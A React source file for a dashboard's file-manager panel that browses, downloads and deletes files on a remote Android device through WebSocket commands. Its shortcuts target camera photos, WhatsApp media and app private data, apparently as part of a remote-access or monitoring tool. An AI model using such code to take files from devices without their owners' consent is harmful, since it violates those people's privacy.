import React, { useEffect, useState } from 'react';
import { useStore } from '../store/useStore';
import { sendCommand } from '../services/wsService';
import { devices as devApi } from '../services/api';
import type { FileEntry } from '../types';

interface Props { deviceId: string }

const EXT_ICONS: Record<string, string> = {
  jpg: '🖼', jpeg: '🖼', png: '🖼', gif: '🖼', webp: '🖼', bmp: '🖼',
  mp4: '🎬', mkv: '🎬', avi: '🎬', mov: '🎬',
  mp3: '🎵', wav: '🎵', aac: '🎵', ogg: '🎵',
  pdf: '📄', doc: '📄', docx: '📄', txt: '📄',
  zip: '📦', rar: '📦', tar: '📦', gz: '📦',
  apk: '📱',
};
const fileIcon = (f: FileEntry) => {
  if (f.isDir) return '📁';
  const ext = f.name.split('.').pop()?.toLowerCase() ?? '';
  return EXT_ICONS[ext] ?? '📄';
};
const fmtSize = (b: number) => {
  if (b < 1024)       return `${b} B`;
  if (b < 1024 ** 2)  return `${(b / 1024).toFixed(1)} KB`;
  if (b < 1024 ** 3)  return `${(b / 1024 ** 2).toFixed(1)} MB`;
  return `${(b / 1024 ** 3).toFixed(2)} GB`;
};

export const FileManager: React.FC<Props> = ({ deviceId }) => {
  const fileListings   = useStore((s) => s.fileListings);
  const setFileListing = useStore((s) => s.setFileListing);
  const addToast       = useStore((s) => s.addToast);
  const [path, setPath]       = useState('/sdcard');
  const [loading, setLoading] = useState(false);
  const [filter, setFilter]   = useState('');

  const key      = `${deviceId}:${path}`;
  const entries  = fileListings.get(key) ?? [];
  const filtered = filter
    ? entries.filter(e => e.name.toLowerCase().includes(filter.toLowerCase()))
    : entries;

  const loadPath = async (p: string) => {
    setLoading(true);
    setFilter('');
    // Ask device to send file listing
    sendCommand(deviceId, 'GET_FILES', { path: p });
    // Also try REST API fallback
    try {
      const { files } = await devApi.files(deviceId, p);
      setFileListing(deviceId, p, files);
    } catch {
      // Will be populated by WS when device responds
    }
    setPath(p);
    setLoading(false);
  };

  useEffect(() => { loadPath(path); }, [deviceId]);

  const openEntry = (f: FileEntry) => {
    if (f.isDir) loadPath(f.path);
  };

  const goUp = () => {
    const parent = path.split('/').slice(0, -1).join('/') || '/';
    loadPath(parent);
  };

  const downloadFile = (f: FileEntry) => {
    const url = devApi.downloadFile(deviceId, f.path);
    window.open(url, '_blank');
    addToast({ type: 'info', message: `Downloading ${f.name}…`, duration: 3000 });
  };

  const deleteFile = (f: FileEntry) => {
    if (!confirm(`Delete ${f.name}?`)) return;
    sendCommand(deviceId, 'DELETE_FILE', { path: f.path });
    // Optimistic update
    setFileListing(deviceId, path, entries.filter(e => e.path !== f.path));
    addToast({ type: 'success', message: `Deleted ${f.name}`, duration: 2000 });
  };

  const QUICK_PATHS = [
    { label: 'Storage',      path: '/sdcard' },
    { label: 'Downloads',    path: '/sdcard/Download' },
    { label: 'DCIM',         path: '/sdcard/DCIM' },
    { label: 'WhatsApp',     path: '/sdcard/WhatsApp/Media' },
    { label: 'Documents',    path: '/sdcard/Documents' },
    { label: 'Data',         path: '/data/data' },
  ];

  return (
    <div className="h-full flex flex-col" style={{ fontFamily: 'var(--font-mono)' }}>
      {/* Toolbar */}
      <div className="px-3 py-2.5 border-b border-slate-800 shrink-0 flex items-center gap-2">
        <button onClick={goUp} disabled={path === '/'} className="w-7 h-7 flex items-center justify-center rounded hover:bg-slate-800 text-slate-400 hover:text-white disabled:opacity-30 transition-colors">
          ↑
        </button>
        <span className="text-[11px] font-mono text-slate-400 truncate flex-1 bg-slate-900/60 rounded px-2 py-1">
          {path}
        </span>
        <input
          type="text" placeholder="filter…" value={filter}
          onChange={e => setFilter(e.target.value)}
          className="w-28 bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px] text-white/70 outline-none placeholder-slate-600"
        />
        <button onClick={() => loadPath(path)} className="text-[11px] px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors">↺</button>
      </div>

      {/* Quick access */}
      <div className="px-3 py-1.5 border-b border-slate-800/60 flex items-center gap-1.5 flex-wrap shrink-0">
        {QUICK_PATHS.map(({ label, path: p }) => (
          <button
            key={p}
            onClick={() => loadPath(p)}
            className={`text-[10px] px-2 py-0.5 rounded font-mono transition-colors ${
              p === path ? 'bg-cyan-900/40 text-cyan-400 border border-cyan-800/40' : 'bg-slate-800/60 text-slate-500 hover:text-slate-300'
            }`}
          >
            {label}
          </button>
        ))}
      </div>

      {/* File list */}
      <div className="flex-1 overflow-y-auto">
        {loading ? (
          <div className="flex items-center justify-center h-32">
            <span className="text-xs text-slate-600 animate-pulse">Loading…</span>
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex items-center justify-center h-32">
            <span className="text-xs text-slate-600">
              {entries.length === 0 ? 'No files — request sent to device' : 'No matches'}
            </span>
          </div>
        ) : (
          <table className="w-full text-[11px]">
            <thead>
              <tr className="border-b border-slate-800/60 text-slate-600 uppercase text-[9px] tracking-wider">
                <th className="text-left px-3 py-1.5">Name</th>
                <th className="text-right px-3 py-1.5 w-20">Size</th>
                <th className="text-right px-3 py-1.5 w-28">Modified</th>
                <th className="w-16 px-2 py-1.5" />
              </tr>
            </thead>
            <tbody>
              {filtered
                .sort((a, b) => (b.isDir ? 1 : 0) - (a.isDir ? 1 : 0) || a.name.localeCompare(b.name))
                .map((f) => (
                  <tr
                    key={f.path}
                    className="border-b border-slate-900 hover:bg-slate-800/30 group transition-colors"
                  >
                    <td
                      className={`px-3 py-1.5 flex items-center gap-2 truncate max-w-xs cursor-pointer ${f.isDir ? 'text-cyan-400' : 'text-slate-300'}`}
                      onClick={() => openEntry(f)}
                    >
                      <span className="shrink-0">{fileIcon(f)}</span>
                      <span className="truncate">{f.name}</span>
                    </td>
                    <td className="text-right px-3 py-1.5 text-slate-500 tabular-nums">
                      {f.isDir ? '—' : fmtSize(f.size)}
                    </td>
                    <td className="text-right px-3 py-1.5 text-slate-600">
                      {new Date(f.modified).toLocaleDateString('en', { month: 'short', day: 'numeric', year: '2-digit' })}
                    </td>
                    <td className="px-2 py-1.5">
                      <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                        {!f.isDir && (
                          <button onClick={() => downloadFile(f)} title="Download" className="w-6 h-6 rounded hover:bg-cyan-800/40 text-cyan-400 text-xs flex items-center justify-center">↓</button>
                        )}
                        <button onClick={() => deleteFile(f)} title="Delete" className="w-6 h-6 rounded hover:bg-red-800/40 text-red-400 text-xs flex items-center justify-center">✕</button>
                      </div>
                    </td>
                  </tr>
                ))}
            </tbody>
          </table>
        )}
      </div>

      {/* Footer */}
      <div className="px-4 py-1.5 border-t border-slate-800 text-[10px] text-slate-600 font-mono shrink-0 flex items-center gap-3">
        <span>{filtered.length} items</span>
        <span className="text-slate-700">·</span>
        <span>{entries.filter(e => !e.isDir).reduce((s, e) => s + e.size, 0) > 0
          ? fmtSize(entries.filter(e => !e.isDir).reduce((s, e) => s + e.size, 0))
          : '—'
        }</span>
      </div>
    </div>
  );
};
